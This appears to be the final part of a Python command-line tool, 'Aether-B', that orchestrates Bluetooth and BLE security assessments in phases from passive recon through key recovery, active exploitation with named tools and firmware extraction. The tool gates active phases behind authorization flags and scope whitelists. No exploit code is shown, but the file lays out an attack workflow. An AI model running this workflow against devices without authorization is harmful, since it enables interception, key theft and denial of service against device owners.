        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  sudo python3 aether_b.py --config config.json --project my_assessment
  sudo python3 aether_b.py --target-bdaddr AA:BB:CC:DD:EE:FF --phase enumeration
  sudo python3 aether_b.py --phase key_recovery --hci hci0
  sudo python3 aether_b.py --phase firmware --physical-access
  sudo python3 aether_b.py --list-phases
""",
    )
    parser.add_argument("--config", "-c", default=_default_cfg,
                        help="JSON config file (default: next to aether_b.py)")
    parser.add_argument("--project", "-p", default=_default_project,
                        help="Project root directory for all output files")
    parser.add_argument("--hci",
                        help="HCI device to use (e.g. hci0, hci1)")
    parser.add_argument("--ubertooth",
                        help="Ubertooth device path (e.g. /dev/ttyACM0)")
    parser.add_argument("--target-bdaddr", action="append", dest="target_bdaddrs",
                        metavar="AA:BB:CC:DD:EE:FF",
                        help="Target Bluetooth BD address (repeatable)")
    parser.add_argument("--target-uuid", action="append", dest="target_uuids",
                        metavar="UUID",
                        help="Target BLE service UUID (repeatable)")
    parser.add_argument("--phase",
                        choices=["passive_recon", "enumeration", "key_recovery",
                                 "exploitation", "firmware"],
                        help="Run a single phase only")
    parser.add_argument("--timeout", "-t", type=int,
                        help="Per-phase timeout in seconds")
    parser.add_argument("--physical-access", action="store_true",
                        help="Confirm physical access to devices (enables JTAG/SWD extraction)")
    parser.add_argument("--injection-authorized", action="store_true",
                        help="Confirm injection / MITM is authorised (enables exploitation phases)")
    parser.add_argument("--dos-authorized", action="store_true",
                        help="Confirm DoS testing is authorised")
    parser.add_argument("--pairing-authorized", action="store_true",
                        help="Confirm active pairing attempts are authorised")
    parser.add_argument("--cve-testing-authorized", action="store_true",
                        help="Confirm CVE exploit testing is authorised (enables BlueToolkit)")
    parser.add_argument("--scope-bdaddr", action="append", dest="scope_bdaddrs",
                        metavar="AA:BB:CC:DD:EE:FF",
                        help="Scope whitelist BD address (repeatable)")
    parser.add_argument("--scope-uuid", action="append", dest="scope_uuids",
                        metavar="UUID",
                        help="Scope whitelist service UUID (repeatable)")
    parser.add_argument("--list-phases", action="store_true",
                        help="List available phases and exit")
    parser.add_argument("--version", action="version", version=f"Aether-B {VERSION}")
    return parser.parse_args()


def main() -> None:
    args = _parse_args()

    if args.list_phases:
        print("Aether-B — Available phases:")
        print("  passive_recon — Phase 0: Passive BT/BLE device discovery    (ubertooth-scan / hcitool / btscanner)")
        print("  enumeration   — Phase 1: Service and GATT enumeration        (sdptool / gatttool / hcitool info)")
        print("  key_recovery  — Phase 2: Key recovery and pairing weakness   (crackle / ubertooth-btle / tshark)")
        print("  exploitation  — Phase 3: Active exploitation (requires auth) (bettercap / GATTacker / BlueToolkit)")
        print("  firmware      — Phase 4: Firmware extraction and analysis    (openocd / binwalk)")
        sys.exit(0)

    _load_catalogue()
    _startup_tool_check()

    config_path = Path(args.config)
    cfg = _load_config(config_path)

    # CLI overrides
    if args.hci:
        cfg["hci_device"] = args.hci
    if args.ubertooth:
        cfg["ubertooth_device"] = args.ubertooth
    if args.target_bdaddrs:
        cfg["target_bdaddrs"] = args.target_bdaddrs
    if args.target_uuids:
        cfg["target_uuids"] = args.target_uuids
    if args.timeout is not None:
        cfg["timeout_per_phase"] = args.timeout
    if args.physical_access:
        cfg["physical_access"] = True
    if args.injection_authorized:
        cfg["injection_authorized"] = True
    if args.dos_authorized:
        cfg["dos_authorized"] = True
    if args.pairing_authorized:
        cfg["pairing_authorized"] = True
    if args.cve_testing_authorized:
        cfg["cve_testing_authorized"] = True
    if args.scope_bdaddrs:
        cfg.setdefault("scope", {})["bdaddrs"] = args.scope_bdaddrs
    if args.scope_uuids:
        cfg.setdefault("scope", {})["uuids"] = args.scope_uuids

    # Single-phase mode
    if args.phase:
        _all_phases = ["passive_recon", "enumeration", "key_recovery", "exploitation", "firmware"]
        cfg["phases"] = {k: (k == args.phase) for k in _all_phases}

    if not args.project:
        _cs = (cfg.get("client_short") or "").strip()
        _sd = (cfg.get("start_date") or "").strip()
        args.project = str(_build_project_dir(_cs, _sd, os.environ.get("SPECTRE_TOOL_ID", "aether-b")))

    project_dir = Path(args.project)
    project_dir.mkdir(parents=True, exist_ok=True)
    _write_project_meta(
        project_dir,
        tool=os.environ.get("SPECTRE_TOOL_ID", "aether-b"),
        client_short=cfg.get("client_short", ""),
        year=((cfg.get("start_date") or "")[:4] or datetime.now(timezone.utc).strftime("%Y")),
        version=VERSION,
    )

    run(cfg, project_dir)


# ── Module-level catalogue load ───────────────────────────────────────────────
_load_catalogue()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        _log("Assessment interrupted by operator.")
        sys.exit(0)
